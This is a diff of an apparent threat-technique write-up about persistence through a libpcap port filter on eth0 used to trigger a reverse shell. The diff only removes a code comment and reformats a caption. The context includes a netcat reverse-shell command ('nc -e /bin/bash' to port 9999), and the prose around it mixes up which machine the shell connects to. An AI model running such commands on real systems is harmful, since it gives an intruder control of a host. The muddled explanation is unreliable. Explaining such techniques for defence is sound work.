@@ -15,7 +15,7 @@ Once an adversary compromises a system, they may seek to maintain persistence th
 
 ***Example:*** an adversary may install a filter on **eth0** (the primary network interface) to monitor TCP traffic on a specific port (e.g. 9999), which they’ll later use to communicate with a reverse shell or to send commands.
 
-    // C code using libpcap to set a filter on port 9999 for reverse shell activation
+
     #include <pcap.h>
     #include <stdio.h>
     
@@ -58,8 +58,8 @@ Once the filter is active, the adversary can send a specially crafted packet to 
 
 For instance, using **netcat** or another tool, the attacker may initiate a reverse shell connection through the specified port:
 
-`# Attacker's machine sends a reverse shell connection to port 9999 on the target
-nc -e /bin/bash 192.168.1.100 9999` 
+***Attacker's machine sends a reverse shell connection to port 9999 on the target***
+`nc -e /bin/bash 192.168.1.100 9999` 
 
 This command establishes a reverse shell to the attacker's machine, and since the filter is set to listen on port 9999, it will trigger the reverse shell activation when the packet is received.
 
